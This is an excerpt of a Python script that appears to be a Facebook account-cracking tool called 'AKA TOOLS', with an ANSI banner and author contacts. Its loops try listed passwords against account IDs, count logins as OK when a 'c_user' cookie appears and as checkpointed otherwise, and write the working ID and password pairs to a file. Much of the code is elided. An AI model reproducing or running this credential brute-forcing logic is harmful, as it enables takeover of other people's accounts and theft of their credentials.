...
\033[1;37;1m[!]======================================================
         \033[1;31m•\033[1;93m•\033[1;37m\x1b[0;91m [ WELLCOME TO AKA TOOLS ]\x1b[0;34m \033[1;33m•\033[1;91m•\033[1;37m
\033[1;37;1m[!]======================================================
\033[1;37;1m[•] Author   : MR-AKA
\033[1;37;1m[•] Facebook : https://www.facebook.com/profile.php?id=100079143742521
\033[1;37;1m[•] Whatsapp : FUCK YOU
\033[1;37;1m[•] GitHub   : AKA-404
\033[1;37;1m[•] Youtube  : TRICKER AKA
\033[1;37;1m[•] Virson   : 3.5.6
\033[1;37;1m[!]======================================================"""  
loop = 0
oks = []
cps = []
...
def random_crack():
	...
	if opt =='1':
		...
		os.system("xdg-open https://chat.01706200853.com/")
		random_crack()  
	elif opt =='0':
		exit("\n [✓] Thank you so much♥️\n")
	else:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\033[1;92m[AKA-OK] '+cid+' | '+ps+'\033[0;97m')
				...
				continue
		loop+=1
		sys.stdout.write('\r\033[1;32m [AKA] \033[1;97m%s/%s   \033[1;92mOK-:%s | \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
	except:
		pass
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\033[1;92m[AKA-OK] '+cid+' | '+ps+'\033[0;97m')
				open('Aka-ok.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				...
				continue
		loop+=1
		sys.stdout.write('\r\033[1;97m[\033[1;92mJUSTIN\033[1;91m♡\033[1;92mAKA\033[1;97m] %s/%s  [\033[1;92mOK\033[1;97m-:\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m-:\033[1;91m%s\033[1;97m]'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
	except:
		pass
menu()
